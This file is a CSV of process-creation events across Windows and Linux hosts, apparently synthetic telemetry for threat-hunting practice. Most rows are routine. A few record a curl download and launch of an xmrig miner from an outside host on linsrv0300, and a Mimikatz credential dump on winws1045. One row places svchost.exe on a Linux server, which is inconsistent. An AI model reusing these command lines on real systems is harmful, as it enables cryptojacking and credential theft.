Hostname,Username,ProcessName,ProcessID,ParentProcessName,ParentProcessID,CommandLine,EventTimestamp
winws0193,m.chen,msedge.exe,15701,explorer.exe,5270,null,2025-09-15 08:31:03.789678 UTC
winws1207,m.chen,msedge.exe,11301,explorer.exe,4310,null,2025-09-15 08:22:21.789678 UTC
winws1097,m.chen,msedge.exe,23001,explorer.exe,6880,null,2025-09-15 08:45:42.456345 UTC
winws1303,m.chen,msedge.exe,23301,explorer.exe,6950,null,2025-09-15 08:46:21.789678 UTC
winws1057,m.chen,msedge.exe,13001,explorer.exe,4680,null,2025-09-15 08:25:42.123012 UTC
winws1302,m.chen,svchost.exe,9200,services.exe,500,null,2025-09-15 08:46:00.456345 UTC
winws1274,m.chen,svchost.exe,7100,services.exe,500,null,2025-09-15 08:39:00.789678 UTC
winws1294,m.chen,svchost.exe,8600,services.exe,500,null,2025-09-15 08:44:00.123012 UTC
winws1254,m.chen,svchost.exe,5600,services.exe,500,null,2025-09-15 08:34:00.456345 UTC
winws1234,m.chen,svchost.exe,4100,services.exe,500,null,2025-09-15 08:29:00.123012 UTC
winws1214,m.chen,svchost.exe,2600,services.exe,500,null,2025-09-15 08:24:00.789678 UTC
winws1310,m.chen,svchost.exe,9800,services.exe,500,null,2025-09-15 08:48:00.789678 UTC
winws1047,m.chen,svchost.exe,1600,services.exe,500,null,2025-09-15 08:20:42.789678 UTC
winws1313,m.chen,teams.exe,24601,explorer.exe,7230,null,2025-09-15 08:48:51.456345 UTC
winws1257,m.chen,teams.exe,17601,explorer.exe,5690,null,2025-09-15 08:34:51.123012 UTC
winws0173,m.chen,teams.exe,13201,explorer.exe,4720,null,2025-09-15 08:26:03.456345 UTC
winws1217,m.chen,teams.exe,12601,explorer.exe,4590,null,2025-09-15 08:24:51.456345 UTC
winws0107,m.chen,teams.exe,14901,explorer.exe,5090,null,2025-09-15 08:29:27.123012 UTC
winws0127,m.chen,teams.exe,19901,explorer.exe,6190,null,2025-09-15 08:39:27.789678 UTC
winws0212,m.chen,teams.exe,18201,explorer.exe,5820,null,2025-09-15 08:36:03.123012 UTC
winws1297,m.chen,teams.exe,22601,explorer.exe,6790,null,2025-09-15 08:44:51.789678 UTC
winws0147,m.chen,teams.exe,24901,explorer.exe,7290,null,2025-09-15 08:49:27.456345 UTC
winws1305,m.chen,teams.exe,23601,explorer.exe,7010,null,2025-09-15 08:46:51.123012 UTC
winws1083,p.patel,chrome.exe,19501,explorer.exe,6110,null,2025-09-15 08:38:42.789678 UTC
winws1219,p.patel,chrome.exe,12801,explorer.exe,4640,null,2025-09-15 08:25:21.789678 UTC
winws1063,p.patel,chrome.exe,14501,explorer.exe,5010,null,2025-09-15 08:28:42.123012 UTC
winws0113,p.patel,chrome.exe,16401,explorer.exe,5420,null,2025-09-15 08:32:27.123012 UTC
winws1229,p.patel,chrome.exe,14101,explorer.exe,4920,null,2025-09-15 08:27:51.456345 UTC
winws0093,p.patel,chrome.exe,11401,explorer.exe,4320,null,2025-09-15 08:22:27.456345 UTC
winws0152,p.patel,chrome.exe,10601,explorer.exe,4140,null,2025-09-15 08:20:48.456345 UTC
winws1259,p.patel,chrome.exe,17801,explorer.exe,5740,null,2025-09-15 08:35:21.456345 UTC
winws0133,p.patel,chrome.exe,21401,explorer.exe,6520,null,2025-09-15 08:42:27.789678 UTC
winws1269,p.patel,chrome.exe,19101,explorer.exe,6020,null,2025-09-15 08:37:51.123012 UTC
winws1299,p.patel,chrome.exe,22801,explorer.exe,6840,null,2025-09-15 08:45:21.123012 UTC
winws0221,p.patel,explorer.exe,6060,services.exe,500,null,2025-09-15 08:38:18.123012 UTC
winws1048,p.patel,explorer.exe,4180,services.exe,500,null,2025-09-15 08:21:12.123012 UTC
winws1312,p.patel,explorer.exe,7190,services.exe,500,null,2025-09-15 08:48:30.123012 UTC
winws0211,p.patel,explorer.exe,5790,services.exe,500,null,2025-09-15 08:35:48.456345 UTC
winws0202,p.patel,explorer.exe,5510,services.exe,500,null,2025-09-15 08:33:18.789678 UTC
winws0098,p.patel,explorer.exe,4600,services.exe,500,null,2025-09-15 08:24:57.123012 UTC
winws0182,p.patel,explorer.exe,4960,services.exe,500,null,2025-09-15 08:28:18.456345 UTC
winws0175,p.patel,explorer.exe,4780,services.exe,500,null,2025-09-15 08:26:33.789678 UTC
winws0265,p.patel,explorer.exe,7270,services.exe,500,null,2025-09-15 08:49:18.456345 UTC
winws0118,p.patel,explorer.exe,5700,services.exe,500,null,2025-09-15 08:34:57.789678 UTC
winws0214,p.patel,explorer.exe,5880,services.exe,500,null,2025-09-15 08:36:33.456345 UTC
winws0192,p.patel,explorer.exe,5240,services.exe,500,null,2025-09-15 08:30:48.123012 UTC
winws0231,p.patel,explorer.exe,6340,services.exe,500,null,2025-09-15 08:40:48.789678 UTC
winws1068,p.patel,explorer.exe,5280,services.exe,500,null,2025-09-15 08:31:12.789678 UTC
winws1098,p.patel,explorer.exe,6930,services.exe,500,null,2025-09-15 08:46:12.789678 UTC
winws1236,p.patel,explorer.exe,5100,services.exe,500,null,2025-09-15 08:29:30.456345 UTC
winws0146,p.patel,explorer.exe,7240,services.exe,500,null,2025-09-15 08:48:57.123012 UTC
winws1304,p.patel,explorer.exe,6970,services.exe,500,null,2025-09-15 08:46:30.789678 UTC
winws1078,p.patel,explorer.exe,5830,services.exe,500,null,2025-09-15 08:36:12.123012 UTC
winws1058,p.patel,explorer.exe,4730,services.exe,500,null,2025-09-15 08:26:12.456345 UTC
winws1088,p.patel,explorer.exe,6380,services.exe,500,null,2025-09-15 08:41:12.456345 UTC
winws0172,p.patel,explorer.exe,4690,services.exe,500,null,2025-09-15 08:25:48.789678 UTC
winws0142,p.patel,explorer.exe,7020,services.exe,500,null,2025-09-15 08:46:57.789678 UTC
winws0155,p.patel,explorer.exe,4230,services.exe,500,null,2025-09-15 08:21:33.456345 UTC
winws0138,p.patel,explorer.exe,6800,services.exe,500,null,2025-09-15 08:44:57.456345 UTC
winws0257,p.patel,explorer.exe,7050,services.exe,500,null,2025-09-15 08:47:18.123012 UTC
winws0251,p.patel,explorer.exe,6890,services.exe,500,null,2025-09-15 08:45:48.123012 UTC
winws0128,p.patel,explorer.exe,6250,services.exe,500,null,2025-09-15 08:39:57.123012 UTC
winws1320,p.patel,explorer.exe,7410,services.exe,500,null,2025-09-15 08:50:30.456345 UTC
winws0195,p.patel,explorer.exe,5330,services.exe,500,null,2025-09-15 08:31:33.123012 UTC
winws0162,p.patel,explorer.exe,4410,services.exe,500,null,2025-09-15 08:23:18.123012 UTC
winws0241,p.patel,explorer.exe,6610,services.exe,500,null,2025-09-15 08:43:18.456345 UTC
winws1216,p.patel,explorer.exe,4550,services.exe,500,null,2025-09-15 08:24:30.123012 UTC
winws1296,p.patel,explorer.exe,6750,services.exe,500,null,2025-09-15 08:44:30.456345 UTC
winws1276,p.patel,explorer.exe,6200,services.exe,500,null,2025-09-15 08:39:30.123012 UTC
winws0108,p.patel,explorer.exe,5150,services.exe,500,null,2025-09-15 08:29:57.456345 UTC
winws0234,p.patel,explorer.exe,6430,services.exe,500,null,2025-09-15 08:41:33.789678 UTC
winws1101,p.patel,msedge.exe,24001,explorer.exe,7100,null,2025-09-15 08:47:42.789678 UTC
winws1073,p.patel,msedge.exe,17001,explorer.exe,5560,null,2025-09-15 08:33:42.456345 UTC
winws1279,p.patel,msedge.exe,20301,explorer.exe,6290,null,2025-09-15 08:40:21.789678 UTC
winws1046,p.patel,msedge.exe,10201,explorer.exe,4060,null,2025-09-15 08:15:22.321654 UTC
winws0224,p.patel,msedge.exe,19701,explorer.exe,6150,null,2025-09-15 08:39:03.123012 UTC
winws1105,p.patel,msedge.exe,25001,explorer.exe,7320,null,2025-09-15 08:49:42.123012 UTC
winws0185,p.patel,msedge.exe,14701,explorer.exe,5050,null,2025-09-15 08:29:03.456345 UTC
winws1239,p.patel,msedge.exe,15301,explorer.exe,5190,null,2025-09-15 08:30:21.123012 UTC
winws1053,p.patel,msedge.exe,12001,explorer.exe,4460,null,2025-09-15 08:23:42.789678 UTC
winws1093,p.patel,msedge.exe,22001,explorer.exe,6660,null,2025-09-15 08:43:42.123012 UTC
winws1266,p.patel,svchost.exe,6500,services.exe,500,null,2025-09-15 08:37:00.456345 UTC
winws1206,p.patel,svchost.exe,2000,services.exe,500,null,2025-09-15 08:22:00.456345 UTC
winws1226,p.patel,svchost.exe,3500,services.exe,500,null,2025-09-15 08:27:00.789678 UTC
winws1246,p.patel,svchost.exe,5000,services.exe,500,null,2025-09-15 08:32:00.123012 UTC
winws1286,p.patel,svchost.exe,8000,services.exe,500,null,2025-09-15 08:42:00.789678 UTC
winws0165,p.patel,teams.exe,12201,explorer.exe,4500,null,2025-09-15 08:24:03.123012 UTC
winws0244,p.patel,teams.exe,22201,explorer.exe,6700,null,2025-09-15 08:44:03.456345 UTC
winws0268,p.patel,teams.exe,25201,explorer.exe,7360,null,2025-09-15 08:50:03.456345 UTC
winws1209,p.patel,teams.exe,11601,explorer.exe,4370,null,2025-09-15 08:22:51.123012 UTC
winws1289,p.patel,teams.exe,21601,explorer.exe,6570,null,2025-09-15 08:42:51.456345 UTC
winws0205,p.patel,teams.exe,17201,explorer.exe,5600,null,2025-09-15 08:34:03.789678 UTC
winws0260,p.patel,teams.exe,24201,explorer.exe,7140,null,2025-09-15 08:48:03.123012 UTC
winws0123,p.patel,teams.exe,18901,explorer.exe,5970,null,2025-09-15 08:37:27.456345 UTC
winws1249,p.patel,teams.exe,16601,explorer.exe,5470,null,2025-09-15 08:32:51.789678 UTC
winws0103,p.patel,teams.exe,13901,explorer.exe,4870,null,2025-09-15 08:27:27.789678 UTC
linsrv0300,svc_api,curl,2200,bash,2150,curl -o /tmp/xmrig http://data-miner-pool.net/xmrig,2025-09-15 08:16:15.456234 UTC
linsrv0300,svc_api,chmod,2201,bash,2150,chmod +x /tmp/xmrig,2025-09-15 08:16:18.789567 UTC
linapp0103,svc_api,gunicorn,11401,systemd,1,null,2025-09-15 08:20:39.456345 UTC
linsrv0300,svc_api,bash,2150,sshd,2100,null,2025-09-15 08:16:10.12389 UTC
linsrv0300,svc_api,xmrig,2205,bash,2150,./tmp/xmrig -o 185.125.190.22:4444 -u (wallet) -p x,2025-09-15 08:16:20.123901 UTC
linsrv0300,svc_api,sshd,2100,systemd,1,null,2025-09-15 08:16:00.789456 UTC
linapp0132,svc_api,java,14301,systemd,1,null,2025-09-15 08:35:06.789678 UTC
linapp0120,svc_api,java,13101,systemd,1,null,2025-09-15 08:29:06.789678 UTC
linapp0124,svc_api,java,13501,systemd,1,null,2025-09-15 08:31:06.123012 UTC
linapp0142,svc_api,java,15301,systemd,1,null,2025-09-15 08:40:06.123012 UTC
linapp0154,svc_api,java,16501,systemd,1,null,2025-09-15 08:46:06.123012 UTC
linapp0128,svc_api,java,13901,systemd,1,null,2025-09-15 08:33:06.456345 UTC
linapp0152,svc_api,java,16301,systemd,1,null,2025-09-15 08:45:06.456345 UTC
linapp0134,svc_api,java,14501,systemd,1,null,2025-09-15 08:36:06.456345 UTC
linapp0104,svc_api,java,11501,systemd,1,null,2025-09-15 08:21:06.456345 UTC
linapp0101,svc_api,java,11201,systemd,1,null,2025-09-15 08:05:12.456789 UTC
linapp0106,svc_api,java,11701,systemd,1,null,2025-09-15 08:22:06.123012 UTC
linapp0160,svc_api,java,17101,systemd,1,null,2025-09-15 08:49:06.123012 UTC
linapp0116,svc_api,java,12701,systemd,1,null,2025-09-15 08:27:06.456345 UTC
linapp0126,svc_api,java,13701,systemd,1,null,2025-09-15 08:32:06.789678 UTC
linapp0156,svc_api,java,16701,systemd,1,null,2025-09-15 08:47:06.789678 UTC
linapp0112,svc_api,java,12301,systemd,1,null,2025-09-15 08:25:06.123012 UTC
linapp0144,svc_api,java,15501,systemd,1,null,2025-09-15 08:41:06.789678 UTC
linapp0138,svc_api,java,14901,systemd,1,null,2025-09-15 08:38:06.789678 UTC
linapp0118,svc_api,java,12901,systemd,1,null,2025-09-15 08:28:06.123012 UTC
linapp0110,svc_api,java,12101,systemd,1,null,2025-09-15 08:24:06.456345 UTC
linapp0136,svc_api,java,14701,systemd,1,null,2025-09-15 08:37:06.123012 UTC
linapp0150,svc_api,java,16101,systemd,1,null,2025-09-15 08:44:06.789678 UTC
linapp0140,svc_api,java,15101,systemd,1,null,2025-09-15 08:39:06.456345 UTC
linapp0148,svc_api,java,15901,systemd,1,null,2025-09-15 08:43:06.123012 UTC
linapp0158,svc_api,java,16901,systemd,1,null,2025-09-15 08:48:06.456345 UTC
linapp0108,svc_api,java,11901,systemd,1,null,2025-09-15 08:23:06.789678 UTC
linapp0162,svc_api,java,17301,systemd,1,null,2025-09-15 08:50:06.789678 UTC
linapp0122,svc_api,java,13301,systemd,1,null,2025-09-15 08:30:06.456345 UTC
linapp0114,svc_api,java,12501,systemd,1,null,2025-09-15 08:26:06.789678 UTC
linapp0130,svc_api,java,14101,systemd,1,null,2025-09-15 08:34:06.123012 UTC
linapp0146,svc_api,java,15701,systemd,1,null,2025-09-15 08:42:06.456345 UTC
linapp0119,svc_api,python3,13001,bash,11080,null,2025-09-15 08:28:36.456345 UTC
linapp0153,svc_api,python3,16401,bash,11250,null,2025-09-15 08:45:36.789678 UTC
linapp0107,svc_api,python3,11801,bash,11020,null,2025-09-15 08:22:36.456345 UTC
linapp0137,svc_api,python3,14801,bash,11170,null,2025-09-15 08:37:36.456345 UTC
linapp0139,svc_api,python3,15001,bash,11180,null,2025-09-15 08:38:36.123012 UTC
linapp0135,svc_api,python3,14601,bash,11160,null,2025-09-15 08:36:36.789678 UTC
linapp0161,svc_api,python3,17201,bash,11290,null,2025-09-15 08:49:36.456345 UTC
linapp0117,svc_api,python3,12801,bash,11070,null,2025-09-15 08:27:36.789678 UTC
linapp0125,svc_api,python3,13601,bash,11110,null,2025-09-15 08:31:36.456345 UTC
linapp0129,svc_api,python3,14001,bash,11130,null,2025-09-15 08:33:36.789678 UTC
linapp0133,svc_api,python3,14401,bash,11150,null,2025-09-15 08:35:36.123012 UTC
linapp0109,svc_api,python3,12001,bash,11030,null,2025-09-15 08:23:36.123012 UTC
linapp0149,svc_api,python3,16001,bash,11230,null,2025-09-15 08:43:36.456345 UTC
linapp0127,svc_api,python3,13801,bash,11120,null,2025-09-15 08:32:36.123012 UTC
linapp0102,svc_api,python3,11301,bash,11000,null,2025-09-15 08:15:25.654987 UTC
linapp0159,svc_api,python3,17001,bash,11280,null,2025-09-15 08:48:36.789678 UTC
linapp0145,svc_api,python3,15601,bash,11210,null,2025-09-15 08:41:36.123012 UTC
linapp0123,svc_api,python3,13401,bash,11100,null,2025-09-15 08:30:36.789678 UTC
linapp0115,svc_api,python3,12601,bash,11060,null,2025-09-15 08:26:36.123012 UTC
linapp0111,svc_api,python3,12201,bash,11040,null,2025-09-15 08:24:36.789678 UTC
linapp0141,svc_api,python3,15201,bash,11190,null,2025-09-15 08:39:36.789678 UTC
linapp0131,svc_api,python3,14201,bash,11140,null,2025-09-15 08:34:36.456345 UTC
linapp0113,svc_api,python3,12401,bash,11050,null,2025-09-15 08:25:36.456345 UTC
linapp0105,svc_api,python3,11601,bash,11010,null,2025-09-15 08:21:36.789678 UTC
linapp0147,svc_api,python3,15801,bash,11220,null,2025-09-15 08:42:36.789678 UTC
linapp0155,svc_api,python3,16601,bash,11260,null,2025-09-15 08:46:36.456345 UTC
linapp0157,svc_api,python3,16801,bash,11270,null,2025-09-15 08:47:36.123012 UTC
linapp0143,svc_api,python3,15401,bash,11200,null,2025-09-15 08:40:36.456345 UTC
linapp0121,svc_api,python3,13201,bash,11090,null,2025-09-15 08:29:36.123012 UTC
linapp0151,svc_api,python3,16201,bash,11240,null,2025-09-15 08:44:36.123012 UTC
lindb0089,svc_prod_db,cron,2500,systemd,1,null,2025-09-15 08:44:45.123012 UTC
lindb0083,svc_prod_db,cron,2440,systemd,1,null,2025-09-15 08:41:45.123012 UTC
lindb0047,svc_prod_db,cron,2080,systemd,1,null,2025-09-15 08:23:45.123012 UTC
lindb0077,svc_prod_db,cron,2380,systemd,1,null,2025-09-15 08:38:45.123012 UTC
lindb0093,svc_prod_db,cron,2540,systemd,1,null,2025-09-15 08:46:45.456345 UTC
lindb0071,svc_prod_db,cron,2320,systemd,1,null,2025-09-15 08:35:45.123012 UTC
lindb0085,svc_prod_db,cron,2460,systemd,1,null,2025-09-15 08:42:45.789678 UTC
lindb0097,svc_prod_db,cron,2580,systemd,1,null,2025-09-15 08:48:45.789678 UTC
lindb0045,svc_prod_db,cron,2060,systemd,1,null,2025-09-15 08:22:45.456345 UTC
lindb0067,svc_prod_db,cron,2280,systemd,1,null,2025-09-15 08:33:45.789678 UTC
lindb0043,svc_prod_db,cron,2040,systemd,1,null,2025-09-15 08:21:45.789678 UTC
lindb0041,svc_prod_db,cron,2020,systemd,1,null,2025-09-15 08:20:45.123012 UTC
lindb0055,svc_prod_db,cron,2160,systemd,1,null,2025-09-15 08:27:45.789678 UTC
lindb0061,svc_prod_db,cron,2220,systemd,1,null,2025-09-15 08:30:45.789678 UTC
lindb0049,svc_prod_db,cron,2100,systemd,1,null,2025-09-15 08:24:45.789678 UTC
lindb0063,svc_prod_db,cron,2240,systemd,1,null,2025-09-15 08:31:45.456345 UTC
lindb0059,svc_prod_db,cron,2200,systemd,1,null,2025-09-15 08:29:45.123012 UTC
lindb0073,svc_prod_db,cron,2340,systemd,1,null,2025-09-15 08:36:45.789678 UTC
lindb0075,svc_prod_db,cron,2360,systemd,1,null,2025-09-15 08:37:45.456345 UTC
lindb0095,svc_prod_db,cron,2560,systemd,1,null,2025-09-15 08:47:45.123012 UTC
lindb0081,svc_prod_db,cron,2420,systemd,1,null,2025-09-15 08:40:45.456345 UTC
lindb0053,svc_prod_db,cron,2140,systemd,1,null,2025-09-15 08:26:45.123012 UTC
lindb0065,svc_prod_db,cron,2260,systemd,1,null,2025-09-15 08:32:45.123012 UTC
lindb0087,svc_prod_db,cron,2480,systemd,1,null,2025-09-15 08:43:45.456345 UTC
lindb0069,svc_prod_db,cron,2300,systemd,1,null,2025-09-15 08:34:45.456345 UTC
lindb0057,svc_prod_db,cron,2180,systemd,1,null,2025-09-15 08:28:45.456345 UTC
lindb0099,svc_prod_db,cron,2600,systemd,1,null,2025-09-15 08:49:45.456345 UTC
lindb0051,svc_prod_db,cron,2120,systemd,1,null,2025-09-15 08:25:45.456345 UTC
lindb0091,svc_prod_db,cron,2520,systemd,1,null,2025-09-15 08:45:45.789678 UTC
lindb0079,svc_prod_db,cron,2400,systemd,1,null,2025-09-15 08:39:45.789678 UTC
lindb0080,svc_prod_db,postgres,2410,systemd,1,null,2025-09-15 08:40:15.123012 UTC
lindb0068,svc_prod_db,postgres,2290,systemd,1,null,2025-09-15 08:34:15.123012 UTC
lindb0098,svc_prod_db,postgres,2590,systemd,1,null,2025-09-15 08:49:15.123012 UTC
lindb0078,svc_prod_db,postgres,2390,systemd,1,null,2025-09-15 08:39:15.456345 UTC
lindb0072,svc_prod_db,postgres,2330,systemd,1,null,2025-09-15 08:36:15.456345 UTC
lindb0084,svc_prod_db,postgres,2450,systemd,1,null,2025-09-15 08:42:15.456345 UTC
lindb0096,svc_prod_db,postgres,2570,systemd,1,null,2025-09-15 08:48:15.456345 UTC
lindb0060,svc_prod_db,postgres,2210,systemd,1,null,2025-09-15 08:30:15.456345 UTC
lindb0058,svc_prod_db,postgres,2190,systemd,1,null,2025-09-15 08:29:15.789678 UTC
lindb0040,svc_prod_db,postgres,2010,systemd,1,null,2025-09-15 08:15:20.987654 UTC
lindb0086,svc_prod_db,postgres,2470,systemd,1,null,2025-09-15 08:43:15.123012 UTC
lindb0054,svc_prod_db,postgres,2150,systemd,1,null,2025-09-15 08:27:15.456345 UTC
lindb0092,svc_prod_db,postgres,2530,systemd,1,null,2025-09-15 08:46:15.123012 UTC
lindb0042,svc_prod_db,postgres,2030,systemd,1,null,2025-09-15 08:21:15.456345 UTC
lindb0070,svc_prod_db,postgres,2310,systemd,1,null,2025-09-15 08:35:15.789678 UTC
lindb0062,svc_prod_db,postgres,2230,systemd,1,null,2025-09-15 08:31:15.123012 UTC
lindb0052,svc_prod_db,postgres,2130,systemd,1,null,2025-09-15 08:26:15.789678 UTC
lindb0056,svc_prod_db,postgres,2170,systemd,1,null,2025-09-15 08:28:15.123012 UTC
lindb0094,svc_prod_db,postgres,2550,systemd,1,null,2025-09-15 08:47:15.789678 UTC
lindb0048,svc_prod_db,postgres,2090,systemd,1,null,2025-09-15 08:24:15.456345 UTC
lindb0064,svc_prod_db,postgres,2250,systemd,1,null,2025-09-15 08:32:15.789678 UTC
lindb0090,svc_prod_db,postgres,2510,systemd,1,null,2025-09-15 08:45:15.456345 UTC
lindb0088,svc_prod_db,postgres,2490,systemd,1,null,2025-09-15 08:44:15.789678 UTC
lindb0100,svc_prod_db,postgres,2610,systemd,1,null,2025-09-15 08:50:15.789678 UTC
lindb0082,svc_prod_db,postgres,2430,systemd,1,null,2025-09-15 08:41:15.789678 UTC
lindb0074,svc_prod_db,postgres,2350,systemd,1,null,2025-09-15 08:37:15.123012 UTC
lindb0046,svc_prod_db,postgres,2070,systemd,1,null,2025-09-15 08:23:15.789678 UTC
lindb0076,svc_prod_db,postgres,2370,systemd,1,null,2025-09-15 08:38:15.789678 UTC
lindb0050,svc_prod_db,postgres,2110,systemd,1,null,2025-09-15 08:25:15.123012 UTC
lindb0066,svc_prod_db,postgres,2270,systemd,1,null,2025-09-15 08:33:15.456345 UTC
lindb0044,svc_prod_db,postgres,2050,systemd,1,null,2025-09-15 08:22:15.123012 UTC
winws1045,system,mimikatz.exe,8550,cmd.exe,8500,"""C:\Users\Public\mimi.exe"" ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit""",2025-09-15 08:10:16.445566 UTC
linsrv0300,system,systemd,1,init,0,null,2025-09-15 08:15:30.456123 UTC
winws1045,system,cmd.exe,8500,powershell.exe,7100,cmd.exe /c C:\Users\Public\mimi.exe,2025-09-15 08:10:15.112345 UTC
linsrv0327,system,docker,3140,systemd,1,null,2025-09-15 08:33:54.789678 UTC
linsrv0323,system,docker,3120,systemd,1,null,2025-09-15 08:31:54.456345 UTC
linsrv0353,system,docker,3270,systemd,1,null,2025-09-15 08:46:54.456345 UTC
linsrv0307,system,docker,3040,systemd,1,null,2025-09-15 08:23:54.123012 UTC
linsrv0319,system,docker,3100,systemd,1,null,2025-09-15 08:29:54.123012 UTC
linsrv0321,system,docker,3110,systemd,1,null,2025-09-15 08:30:54.789678 UTC
linsrv0317,system,docker,3090,systemd,1,null,2025-09-15 08:28:54.456345 UTC
linsrv0339,system,docker,3200,systemd,1,null,2025-09-15 08:39:54.789678 UTC
linsrv0359,system,docker,3300,systemd,1,null,2025-09-15 08:49:54.456345 UTC
linsrv0301,system,docker,3010,systemd,1,null,2025-09-15 08:20:54.123012 UTC
linsrv0333,system,docker,3170,systemd,1,null,2025-09-15 08:36:54.789678 UTC
linsrv0331,system,docker,3160,systemd,1,null,2025-09-15 08:35:54.123012 UTC
linsrv0313,system,docker,3070,systemd,1,null,2025-09-15 08:26:54.123012 UTC
linsrv0325,system,docker,3130,systemd,1,null,2025-09-15 08:32:54.123012 UTC
linsrv0329,system,docker,3150,systemd,1,null,2025-09-15 08:34:54.456345 UTC
linsrv0343,system,docker,3220,systemd,1,null,2025-09-15 08:41:54.123012 UTC
linsrv0345,system,docker,3230,systemd,1,null,2025-09-15 08:42:54.789678 UTC
linsrv0357,system,docker,3290,systemd,1,null,2025-09-15 08:48:54.789678 UTC
linsrv0311,system,docker,3060,systemd,1,null,2025-09-15 08:25:54.456345 UTC
linsrv0305,system,docker,3030,systemd,1,null,2025-09-15 08:22:54.456345 UTC
linsrv0341,system,docker,3210,systemd,1,null,2025-09-15 08:40:54.456345 UTC
linsrv0355,system,docker,3280,systemd,1,null,2025-09-15 08:47:54.123012 UTC
linsrv0337,system,docker,3190,systemd,1,null,2025-09-15 08:38:54.123012 UTC
linsrv0303,system,docker,3020,systemd,1,null,2025-09-15 08:21:54.789678 UTC
linsrv0351,system,docker,3260,systemd,1,null,2025-09-15 08:45:54.789678 UTC
linsrv0309,system,docker,3050,systemd,1,null,2025-09-15 08:24:54.789678 UTC
linsrv0349,system,docker,3250,systemd,1,null,2025-09-15 08:44:54.123012 UTC
linsrv0335,system,docker,3180,systemd,1,null,2025-09-15 08:37:54.456345 UTC
linsrv0315,system,docker,3080,systemd,1,null,2025-09-15 08:27:54.789678 UTC
linsrv0347,system,docker,3240,systemd,1,null,2025-09-15 08:43:54.456345 UTC
winsrv0237,system,lsass.exe,708,services.exe,500,null,2025-09-15 08:28:39.789678 UTC
winsrv0257,system,lsass.exe,718,services.exe,500,null,2025-09-15 08:38:39.456345 UTC
winsrv0233,system,lsass.exe,706,services.exe,500,null,2025-09-15 08:26:39.456345 UTC
winsrv0223,system,lsass.exe,701,services.exe,500,null,2025-09-15 08:21:39.123012 UTC
winsrv0259,system,lsass.exe,719,services.exe,500,null,2025-09-15 08:39:39.123012 UTC
winsrv0269,system,lsass.exe,724,services.exe,500,null,2025-09-15 08:44:39.456345 UTC
winsrv0255,system,lsass.exe,717,services.exe,500,null,2025-09-15 08:37:39.789678 UTC
winsrv0247,system,lsass.exe,713,services.exe,500,null,2025-09-15 08:33:39.123012 UTC
winsrv0265,system,lsass.exe,722,services.exe,500,null,2025-09-15 08:42:39.123012 UTC
winsrv0279,system,lsass.exe,729,services.exe,500,null,2025-09-15 08:49:39.789678 UTC
winsrv0235,system,lsass.exe,707,services.exe,500,null,2025-09-15 08:27:39.123012 UTC
winsrv0275,system,lsass.exe,727,services.exe,500,null,2025-09-15 08:47:39.456345 UTC
winsrv0231,system,lsass.exe,705,services.exe,500,null,2025-09-15 08:25:39.789678 UTC
winsrv0273,system,lsass.exe,726,services.exe,500,null,2025-09-15 08:46:39.789678 UTC
winsrv0227,system,lsass.exe,703,services.exe,500,null,2025-09-15 08:23:39.456345 UTC
winsrv0267,system,lsass.exe,723,services.exe,500,null,2025-09-15 08:43:39.789678 UTC
winsrv0229,system,lsass.exe,704,services.exe,500,null,2025-09-15 08:24:39.123012 UTC
winsrv0241,system,lsass.exe,710,services.exe,500,null,2025-09-15 08:30:39.123012 UTC
winsrv0245,system,lsass.exe,712,services.exe,500,null,2025-09-15 08:32:39.456345 UTC
winsrv0263,system,lsass.exe,721,services.exe,500,null,2025-09-15 08:41:39.456345 UTC
winsrv0251,system,lsass.exe,715,services.exe,500,null,2025-09-15 08:35:39.456345 UTC
winsrv0243,system,lsass.exe,711,services.exe,500,null,2025-09-15 08:31:39.789678 UTC
winsrv0225,system,lsass.exe,702,services.exe,500,null,2025-09-15 08:22:39.789678 UTC
winsrv0271,system,lsass.exe,725,services.exe,500,null,2025-09-15 08:45:39.123012 UTC
winsrv0277,system,lsass.exe,728,services.exe,500,null,2025-09-15 08:48:39.123012 UTC
winsrv0249,system,lsass.exe,714,services.exe,500,null,2025-09-15 08:34:39.789678 UTC
winsrv0261,system,lsass.exe,720,services.exe,500,null,2025-09-15 08:40:39.789678 UTC
winsrv0239,system,lsass.exe,709,services.exe,500,null,2025-09-15 08:29:39.456345 UTC
winsrv0253,system,lsass.exe,716,services.exe,500,null,2025-09-15 08:36:39.123012 UTC
winsrv0221,system,lsass.exe,700,services.exe,500,null,2025-09-15 08:20:36.123012 UTC
winsrv0280,system,svchost.exe,10500,services.exe,500,null,2025-09-15 08:50:09.123012 UTC
winsrv0240,system,svchost.exe,4500,services.exe,500,null,2025-09-15 08:30:09.789678 UTC
linsrv0336,system,svchost.exe,7000,services.exe,500,null,2025-09-15 08:38:24.789678 UTC
